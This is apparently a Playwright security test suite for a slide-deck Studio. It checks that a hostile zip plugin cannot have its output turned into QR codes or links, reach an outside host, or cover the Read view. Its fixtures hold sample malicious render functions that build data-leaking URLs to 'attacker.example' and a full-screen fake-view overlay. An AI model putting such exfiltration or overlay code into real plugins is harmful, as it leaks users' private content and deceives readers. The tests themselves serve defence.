import fs from 'node:fs';
import path from 'node:path';
import type { BrowserContext, FrameLocator, Page } from '@playwright/test';
import { ganttZip } from './plugin-fence-fixture';
import { CHROME, expect, gotoStudio, LIVE_PREVIEW, livePreview, persistedSource, setEditorContent, shareExport, test } from './studio-fixture';

// ── A zip plugin writes addresses onto `qr` and chart slides, in the REAL Studio ─────────────────────────────────
//
// spec/LPM.md §10; engineering/decisions/2026-10-16-media-plugins.md §4.5. A plugin's fence now draws on EVERY slide
// (the "shadow" that kept it off slides a shipped pass rebuilds is gone), so every built-in pass that turns slide text
// into an address must skip `[data-lattice-plugin]`. The live risk is the runtime's DOM half inside the preview frame:
// on a `closing qr` slide with NO author link the engine's HTML pass builds nothing, the plugin's output lands, and
// `lib/transformers/qr-general.js` `applyToDom` re-reads `sec.innerHTML` — plugin bullets included. Main's reader built
// a QR code from the plugin's bullet there. This drives the real Library install, the real approval and the real
// preview iframe (HARD RULE #23) and holds:
//
//   · the plugin DREW on all three slides (two `closing qr`, one `kanban` the old shadow denied);
//   · slide 1 (no author link) has ZERO `.qr-figure`; slide 2 has exactly ONE (the author's), and every plugin bullet is
//     still inside the plugin's root;
//   · no element outside `[data-lattice-plugin]` carries `attacker.example` in an attribute;
//   · ZERO requests to `attacker.example` over the whole run (routed to a 204 and logged).
//
// THE SIGNAL that the runtime's DOM pass ran over the plugin's output, not a sleep (HARD RULE #32): after the plugin's
// root is in the frame, the test appends a hidden SENTINEL `section.closing.qr` holding an author bullet. The insertion
// is a childList mutation, so the runtime's observer schedules its content pass, and `qr-general` `applyToDom` walks
// EVERY `section.closing.qr` in the document in one loop. The sentinel gaining its `.qr-figure` is an effect only the
// runtime makes, and it proves the same pass already walked the shown slide, plugin output and all. It doubles as the
// control: the pass is alive and does build a QR from a bullet, so slide 1's zero is a refusal, not a dead pass.
//
// With LATTICE_EVIDENCE_DIR=<dir> it saves the Studio at 1440, 820 and 390 px; off by default, so CI writes nothing.

test.describe.configure({ timeout: 180_000 });
test.use({ deviceScaleFactor: 2 });

const ATTACKER = 'attacker.example';
const EVIDENCE = process.env.LATTICE_EVIDENCE_DIR || '';
const LEAK = `function render(f) {
  var d = encodeURIComponent(f.body);
  var u = 'https://${ATTACKER}/leak?d=' + d;
  return '<ul><li>' + u + '</li><li>' + u + ' <code>url</code></li><li>' + u + ' <code>qr</code></li></ul>';
}
export { render as default };
`;
const DECK = [
	'---',
	'plugins: [gantt-plugin]',
	'---',
	'',
	'<!-- _class: closing qr -->',
	'',
	'## Thank you',
	'',
	'```gantt',
	'SECRET-ONE',
	'```',
	'',
	'---',
	'',
	'<!-- _class: closing qr -->',
	'',
	'## Scan to follow up',
	'',
	'- https://example.com/author',
	'',
	'```gantt',
	'SECRET-TWO',
	'```',
	'',
	'---',
	'',
	'<!-- _class: kanban -->',
	'',
	'## Board status today.',
	'',
	'- Backlog',
	'  - First card `S`',
	'    - team-a',
	'- Done',
	'  - Second card `M`',
	'    - team-b',
	'',
	'```gantt',
	'SECRET-THREE',
	'```',
	'',
].join('\n');

const SENTINEL_ID = 'e2e-runtime-pass-sentinel';

/** The shown slide's section in the live preview. */
const shown = (preview: FrameLocator) => preview.locator('section:not(#e2e-runtime-pass-sentinel)').filter({ has: preview.locator('[data-lattice-plugin="gantt-plugin"]') });

/**
 * Wait until the runtime's content pass has run over the frame as it is NOW (see the header): append a hidden
 * `section.closing.qr` with an author bullet, wait for the runtime to give it a `.qr-figure`, then take it out again.
 */
async function runtimePassRan(page: Page): Promise<void> {
	const handle = await (await page.locator(LIVE_PREVIEW).elementHandle())?.contentFrame();
	if (!handle) throw new Error('no live preview frame');
	await handle.evaluate((id) => {
		document.getElementById(id)?.remove();
		const s = document.createElement('section');
		s.id = id;
		s.className = 'closing qr';
		s.style.cssText = 'position:absolute;left:-99999px;top:0;width:1280px;height:720px;visibility:hidden';
		s.innerHTML = '<h2>Sentinel</h2><ul><li>https://example.com/sentinel</li></ul>';
		document.body.appendChild(s);
	}, SENTINEL_ID);
	await expect.poll(() => handle.evaluate((id) => !!document.getElementById(id)?.querySelector('.qr-figure'), SENTINEL_ID), { timeout: 15_000, message: "the runtime's qr pass never ran on the sentinel" }).toBe(true);
	await handle.evaluate((id) => document.getElementById(id)?.remove(), SENTINEL_ID);
}

test(`a zip plugin cannot turn qr or chart slide text into an address in the Studio preview @crosswidth @webkit-tablet @gecko`, async ({ page, context, browserName }) => {
	// The project's own box (desktop 1440, mobile 390, webkit-tablet 1180): the install runs wide, the oracle at this size.
	const own = page.viewportSize() ?? { width: 1440, height: 900 };
	const attacker = await logAttacker(context, browserName);
	await installAndApprove(page, LEAK, DECK, 'SECRET-THREE', own);

	const preview = livePreview(page);

	/** One slide's oracle, once the plugin has drawn on it and the runtime's pass has run over it. */
	const judge = async (heading: string, qrFigures: number) => {
		await expect(preview.locator('section h2').filter({ hasText: heading })).toBeVisible({ timeout: 30_000 });
		const slide = shown(preview).filter({ has: preview.locator('h2', { hasText: heading }) });
		// The plugin DREW here (its root); after the runtime's pass it still holds all three of its bullets as text.
		await expect(slide.locator('[data-lattice-plugin="gantt-plugin"]')).toHaveCount(1, { timeout: 30_000 });
		await runtimePassRan(page);
		await expect(slide.locator('.qr-figure'), `${heading}: QR figures after the runtime's pass`).toHaveCount(qrFigures);
		await expect(slide.locator('[data-lattice-plugin="gantt-plugin"] li')).toHaveCount(3);
		// Every bullet that names the attacker is still inside the plugin's root, and no figure sits inside it.
		const stray = await slide.evaluate((s, a) => {
			const out: string[] = [];
			for (const el of s.querySelectorAll('*')) {
				if (el.closest('[data-lattice-plugin]')) continue;
				if (el.tagName === 'LI' && (el.textContent || '').includes(a)) out.push(`li outside the root: ${el.textContent}`);
				for (const at of el.attributes) if (at.value.includes(a)) out.push(`<${el.tagName.toLowerCase()} ${at.name}="${at.value}">`);
			}
			for (const at of s.attributes) if (at.value.includes(a)) out.push(`<section ${at.name}="${at.value}">`);
			return out;
		}, ATTACKER);
		expect(stray, `${heading}: plugin text read outside its root`).toEqual([]);
		await expect(slide.locator('[data-lattice-plugin] .qr-figure, [data-lattice-plugin] a[href], [data-lattice-plugin] svg')).toHaveCount(0);
	};

	// The cursor ends the deck, so the preview opens on slide 3 (`kanban`, a chart layout the old shadow denied).
	await judge('Board status today', 0);
	if (EVIDENCE) await shots(page, 'kanban', own);
	await page.getByRole('button', { name: 'Previous slide' }).first().click();
	// Slide 2: the author's own link is the QR, built once.
	await judge('Scan to follow up', 1);
	await page.getByRole('button', { name: 'Previous slide' }).first().click();
	// Slide 1: no author link, so nothing may become a QR.
	await judge('Thank you', 0);
	if (EVIDENCE) await shots(page, 'qr', own);

	// The whole document: nothing outside a plugin root names the attacker, in any slide the frame holds.
	const anywhere = await attackerAttributes(preview);
	expect(anywhere, 'an attribute outside a plugin root names the attacker').toEqual([]);
	expect(attacker, `requests to ${ATTACKER}:\n${attacker.join('\n')}`).toEqual([]);
	test.info().annotations.push({ type: 'network', description: `${browserName}: 0 requests to ${ATTACKER}` });

	// The Studio's OWN exports of the same deck (Share): PDF, images and the webpage go through the same door and the same
	// runtime as the preview, and must not reach the attacker either. The webpage is text, so it gets the preview's oracle:
	// one QR (the author's, slide 2), and the attacker's address only inside plugin roots.
	for (const format of ['pdf', 'images', 'webpage'] as const) {
		await page.getByRole('button', { name: 'Share', exact: true }).click();
		await expect(page.getByRole('dialog')).toBeVisible();
		const download = page.waitForEvent('download', { timeout: 120_000 });
		await shareExport(page, format);
		const file = (await (await download).path()) as string;
		expect(fs.statSync(file).size, `${format}: the export downloaded`).toBeGreaterThan(1000);
		if (format === 'webpage') {
			const html = fs.readFileSync(file, 'utf8');
			// The webpage carries the deck twice: the slides, and the reading document (`#lp-doc`), which repeats slide 2's QR.
			// So every QR in the file must be the SAME figure, and slide 2 must hold it: the author's, never a second payload.
			const figures = [...html.matchAll(/<figure class="qr-figure">[\s\S]*?<\/figure>/g)].map((m) => m[0]);
			expect(figures.length, 'webpage: the author\'s QR is there').toBeGreaterThan(0);
			expect(new Set(figures).size, 'webpage: every QR in the file is the author\'s one figure').toBe(1);
			const slide2 = /<section\b[^>]*data-lattice-slide="2"[^>]*>[\s\S]*?<\/section>/.exec(html)?.[0] ?? '';
			expect(slide2.includes(figures[0]), 'webpage: that figure is slide 2\'s, the author\'s link').toBe(true);
			// No attribute outside a plugin root (an href, a src, a style's url(), a data-*) carries the attacker's address, and
			// its text appears only inside plugin roots: the reading document (`#lp-article`) copies a plugin's drawing WITH its
			// root (prose-projection `projectGeneric`), so it is held to the same rule as the slides.
			const outside = html.replace(/<div data-lattice-plugin="gantt-plugin">[\s\S]*?<\/div>/g, '');
			const inAttrs = [...outside.matchAll(/<[a-z][^>]*>/gi)].map((m) => m[0]).filter((tag) => tag.includes(ATTACKER));
			expect(inAttrs, 'webpage: no attribute outside a plugin root carries the attacker\'s address').toEqual([]);
			expect(outside.includes(`${ATTACKER}/leak`), 'webpage: the attacker\'s address is only inside plugin roots, the reading document included').toBe(false);
		}
		if (EVIDENCE) fs.copyFileSync(file, path.join(EVIDENCE, `plugin-address-share-${browserName}.${format === 'images' ? 'zip' : format === 'webpage' ? 'html' : 'pdf'}`));
		await page.keyboard.press('Escape');
	}
	expect(attacker, `requests to ${ATTACKER} after the Share exports:\n${attacker.join('\n')}`).toEqual([]);
	test.info().annotations.push({ type: 'network', description: `${browserName}: 0 requests to ${ATTACKER} across PDF, images and webpage exports` });

	await logSeesControl(page, attacker);
});

/**
 * Log every request to the attacker's host for the whole context. Routed to a 204 and logged on Chromium and Gecko.
 * NOT routed on WebKit: any interception there fails the plugin sandbox's load ("the package failed to load", measured
 * on this spec; plugin-video-attack.spec.ts saw the same), so WebKit keeps the plain request log, which still sees the
 * attempt (`.example` never resolves). `logSeesControl` proves the log sees a request this page makes, on every engine.
 */
async function logAttacker(context: BrowserContext, browserName: string): Promise<string[]> {
	const log: string[] = [];
	if (browserName !== 'webkit')
		await context.route(
			(url) => url.hostname === ATTACKER || url.hostname.endsWith(`.${ATTACKER}`),
			(route) => {
				log.push(route.request().url());
				return route.fulfill({ status: 204, body: '' });
			},
		);
	context.on('request', (r) => {
		if (r.url().includes(ATTACKER)) log.push(`(seen) ${r.url()}`);
	});
	return log;
}

/** CONTROL: the log sees a request the page itself makes to the same host, so an empty log is a refusal. */
async function logSeesControl(page: Page, log: string[]): Promise<void> {
	await page.evaluate((a) => {
		const i = new Image();
		i.src = `https://${a}/control.png`;
		document.body.appendChild(i);
	}, ATTACKER);
	await expect.poll(() => log.some((u) => u.includes(`${ATTACKER}/control.png`))).toBe(true);
}

/** Import the plugin through the real Library, write the deck, and approve its code from the notice, at `own`. */
async function installAndApprove(page: Page, code: string, deck: string, marker: string, own: { width: number; height: number }, styles?: string): Promise<void> {
	await page.setViewportSize({ width: 1440, height: 900 });
	await gotoStudio(page);
	const docked = page.getByRole('button', { name: 'Open Library' });
	await ((await docked.count()) ? docked : page.getByRole('button', { name: 'Library', exact: true })).click();
	await page.locator('[data-testid="library-import-input"]').setInputFiles({ name: 'gantt-plugin.zip', mimeType: 'application/zip', buffer: await ganttZip(code, 'gantt-plugin', styles) });
	await expect(page.locator('[data-sonner-toast]').first()).toContainText('1 plugin(s)');
	await page.keyboard.press('Escape');
	await setEditorContent(page, deck);
	await expect.poll(() => persistedSource(page)).toContain(marker);
	await page.setViewportSize(own);
	const notice = page.locator('[data-slot="code-packages"]');
	await expect(notice).toHaveAttribute('data-state', 'unapproved', { timeout: 30_000 });
	await notice.getByRole('button', { name: 'Approve the code of gantt-plugin' }).click();
}

/** Every attribute outside a plugin root, anywhere in the preview document, that names the attacker. */
const attackerAttributes = (preview: FrameLocator) =>
	preview.locator('body').evaluate((b, a) => {
		const out: string[] = [];
		for (const el of b.querySelectorAll('*')) {
			if (el.closest('[data-lattice-plugin]')) continue;
			for (const at of el.attributes) if (at.value.includes(a)) out.push(`<${el.tagName.toLowerCase()} ${at.name}="${at.value.slice(0, 120)}">`);
		}
		return out;
	}, ATTACKER);

// ── The red team's variant: a fence nested in an author's bullet, and a renderer that returns a bare `<li>` ──────────
//
// The browser's implied end tag for `<li>` closes the nearest open `<li>`, walking up past the plugin's root `<div>`, so
// a bare `<li>` the plugin returns would land in the AUTHOR's list, outside `[data-lattice-plugin]`, where every mask
// and `closest()` check reads it as author text, and the runtime's qr pass encoded it. `doorFinishFence`
// (lib/core/door-attr.mjs) refuses an item outside its own list, so the block stays code with the door's note.
const ORPHAN = `function render(f) {
  return '<span>chart</span><li>https://${ATTACKER}/leak?d=' + encodeURIComponent(f.body.trim()) + '</li>';
}
export { render as default };
`;
const NESTED_DECK = ['---', 'plugins: [gantt-plugin]', '---', '', '<!-- _class: closing qr -->', '', '## Our plan', '', '- Our plan:', '', '  ```gantt', '  SECRET-Q4', '  ```', ''].join('\n');

test(`a plugin's bare <li> in a fence nested in a bullet cannot become the author's QR @crosswidth @webkit-tablet @gecko`, async ({ page, context, browserName }) => {
	const own = page.viewportSize() ?? { width: 1440, height: 900 };
	const attacker = await logAttacker(context, browserName);
	await installAndApprove(page, ORPHAN, NESTED_DECK, 'SECRET-Q4', own);

	const preview = livePreview(page);
	const slide = preview.locator('section:not(#e2e-runtime-pass-sentinel)').filter({ has: preview.locator('h2', { hasText: 'Our plan' }) });
	// The door has finished with the block: it either drew (the plugin's "chart") or refused it with a note. Neither text is
	// on the slide before the approved render lands, so this is the render's own signal; the security oracles come FIRST.
	await expect(slide).toContainText(/chart|outside its own list/, { timeout: 30_000 });
	await runtimePassRan(page);
	await expect(slide.locator('.qr-figure'), "the runtime's qr pass built a QR from the plugin's item").toHaveCount(0);
	await expect(slide.locator('li').filter({ hasText: ATTACKER })).toHaveCount(0);
	expect(await attackerAttributes(preview), 'an attribute outside a plugin root names the attacker').toEqual([]);
	expect(attacker, `requests to ${ATTACKER}:\n${attacker.join('\n')}`).toEqual([]);
	// The door ran the renderer and refused what it returned, naming why, on the slide and in the strip above the preview.
	await expect(slide).toContainText(/returned an <li> outside its own list/);
	await expect(page.locator('[data-slot="code-packages"]')).toContainText(/did not draw/);
	await expect(slide.locator('[data-lattice-plugin]')).toHaveCount(0);
	await logSeesControl(page, attacker);
});

/** The Studio at the three widths it ships, preview on the shown slide (LATTICE_EVIDENCE_DIR only). */
async function shots(page: Page, name: string, own: { width: number; height: number }): Promise<void> {
	fs.mkdirSync(EVIDENCE, { recursive: true });
	const project = test.info().project.name;
	for (const [width, height] of [
		[1440, 900],
		[820, 1180],
		[390, 844],
	] as const) {
		await page.setViewportSize({ width, height });
		const plugin = livePreview(page).locator('[data-lattice-plugin="gantt-plugin"]').first();
		await expect(plugin).toBeVisible({ timeout: 30_000 });
		// The pane has re-laid out for this width: the preview frame now fits inside it.
		await expect.poll(() => page.locator(LIVE_PREVIEW).evaluate((f, w) => { const r = f.getBoundingClientRect().width; return r > 0 && r <= w; }, width)).toBe(true);
		// No transition still running on the page or in the preview (a resize cross-fades the slide in): the still is the settled layout.
		const idle = () => document.getAnimations().filter((a) => a.playState === 'running' && a.effect?.getTiming().iterations !== Number.POSITIVE_INFINITY).length;
		await expect.poll(async () => (await page.evaluate(idle)) + (await page.locator(LIVE_PREVIEW).evaluate((f) => ((f as HTMLIFrameElement).contentWindow as Window & typeof globalThis).document.getAnimations().filter((a) => a.playState === 'running' && a.effect?.getTiming().iterations !== Number.POSITIVE_INFINITY).length))).toBe(0);
		await page.screenshot({ path: path.join(EVIDENCE, `plugin-address-${name}-${width}-${project}.png`) });
	}
	await page.setViewportSize(own);
}

// ── The reading view holds a plugin's drawing whole, so it must hold its PAINT too ──────────────────────────────────
//
// The checker on f11014c: the article copies a plugin's root (prose-projection `projectGeneric`), so the plugin's scoped
// stylesheet matches there, and a `position:fixed` box it drew covered the whole Read view. Only `section` contained it
// (base.modifiers.css). The reading hosts now contain it too (`#lp-article`, `.st-read-article`), and a wide drawing
// scales to the column. Measured on BOTH reading hosts: the Studio's Read · Article, and the exported webpage's.
const VEIL_CSS = '.gantt-plugin-veil{position:fixed;inset:0;z-index:2147483647;background:#fff}';
const VEIL = `function render(){
  return '<div class="gantt-plugin-veil">FAKE READING VIEW</div><p style="position:fixed;inset:0;background:#000">FIXED BOX</p>' +
    '<svg width="1600" height="40" viewBox="0 0 1600 40"><rect width="1600" height="40"></rect></svg><p>chart note</p>';
}
export { render as default };`;
const VEIL_DECK = '---\ntheme: cuoio\nplugins: [gantt-plugin]\n---\n\n## Plan of record\n\nThe plan stands.\n\n```gantt\nA 1\n```\n';

/** Where the plugin's veil, fixed box and drawing paint, against its root and the reading column. */
const paintOf = ({ sel, article }: { sel: string; article: string }) => {
	const art = document.querySelector(sel) as HTMLElement;
	const root = art.querySelector('[data-lattice-plugin="gantt-plugin"]') as HTMLElement;
	const box = (el: Element | null) => (el ? el.getBoundingClientRect() : null);
	const r = box(root);
	const a = box(art);
	const inside = (b: DOMRect | null) => !!b && !!r && b.left >= r.left - 1 && b.right <= r.right + 1 && b.top >= r.top - 1 && b.bottom <= r.bottom + 1;
	return {
		article,
		root: !!root,
		// The Studio's article re-sanitizes and drops the plugin's own class, so its stylesheet has nothing to match there:
		// absent counts as contained. The webpage keeps the class, so there the veil must sit inside the root.
		veilInRoot: !root?.querySelector('.gantt-plugin-veil') || inside(box(root.querySelector('.gantt-plugin-veil'))),
		fixedInRoot: inside(box(root?.querySelector('p[style]') ?? null)),
		svgFits: !!a && (box(root?.querySelector('svg') ?? null)?.width ?? 1e9) <= a.width + 1,
		rootFits: !!a && !!r && r.width <= a.width + 1,
		paintsOver: (document.elementFromPoint(innerWidth - 20, innerHeight - 20) as HTMLElement | null)?.closest('[data-lattice-plugin]') !== null,
	};
};

test(`a plugin's veil, fixed box and wide drawing stay in its box in the Read view and the webpage export @crosswidth @webkit-tablet @gecko`, async ({ page, browserName }) => {
	const own = page.viewportSize() ?? { width: 1440, height: 900 };
	await installAndApprove(page, VEIL, VEIL_DECK, 'Plan of record', own, VEIL_CSS);
	await expect(livePreview(page).locator('[data-lattice-plugin="gantt-plugin"]')).toHaveCount(1, { timeout: 30_000 });

	// 1. The exported webpage (Share → Webpage), first, while the Studio is in Craft (a phone's Read posture has no Share),
	// opened as a reader opens it, in its Read · Article view.
	await page.getByRole('button', { name: 'Share', exact: true }).click();
	await expect(page.getByRole('dialog')).toBeVisible();
	const download = page.waitForEvent('download', { timeout: 120_000 });
	await shareExport(page, 'webpage');
	// A download's temp path has no extension, and a page opened from it is read as text: give it its `.html` name.
	const file = path.join(test.info().outputDir, 'veil-export.html');
	fs.mkdirSync(path.dirname(file), { recursive: true });
	await (await download).saveAs(file);
	const reader = await page.context().newPage();
	await reader.setViewportSize(own);
	await reader.goto(`file://${file}`);
	await reader.getByRole('button', { name: 'Read · Article' }).first().click();
	const exportRoot = reader.locator('#lp-article [data-lattice-plugin="gantt-plugin"]');
	await expect(exportRoot).toHaveCount(1);
	await exportRoot.scrollIntoViewIfNeeded();
	const exported = await reader.evaluate(paintOf, { sel: '#lp-article', article: 'webpage' });
	expect(exported).toEqual({ article: 'webpage', root: true, veilInRoot: true, fixedInRoot: true, svgFits: true, rootFits: true, paintsOver: false });
	if (EVIDENCE) for (const dark of [false, true]) {
		if (dark) await reader.locator('#lp-mode').click();
		await reader.screenshot({ path: path.join(EVIDENCE, `plugin-veil-article-${dark ? 'dark' : 'light'}-${own.width}-${browserName}.png`) });
	}
	await reader.close();
	await page.keyboard.press('Escape');

	// 2. The Studio's Read · Article, in the app's own document.
	// The dial is the desktop and tablet route; a phone has no dial, so the posture is parked at Read and the page reloaded
	// (studio-read-wide-diagram.spec.ts does the same; gotoStudio's init script re-seeds `craft`, so it is overwritten).
	const dial = page.getByRole('button', { name: CHROME.postureStops[0] });
	if (await dial.isVisible()) await dial.click();
	else {
		const read = () => {
			const k = 'lattice-studio-settings';
			localStorage.setItem(k, JSON.stringify({ ...JSON.parse(localStorage.getItem(k) || '{}'), posture: 'read' }));
		};
		await page.evaluate(read);
		await page.addInitScript(read);
		await page.reload();
	}
	await page.getByRole('button', { name: CHROME.readArticle }).click();
	const studioRoot = page.locator('.st-read-article [data-lattice-plugin="gantt-plugin"]');
	await expect(studioRoot).toHaveCount(1, { timeout: 30_000 });
	await studioRoot.scrollIntoViewIfNeeded();
	const studio = await page.evaluate(paintOf, { sel: '.st-read-article', article: 'studio' });
	expect(studio).toEqual({ article: 'studio', root: true, veilInRoot: true, fixedInRoot: true, svgFits: true, rootFits: true, paintsOver: false });

});
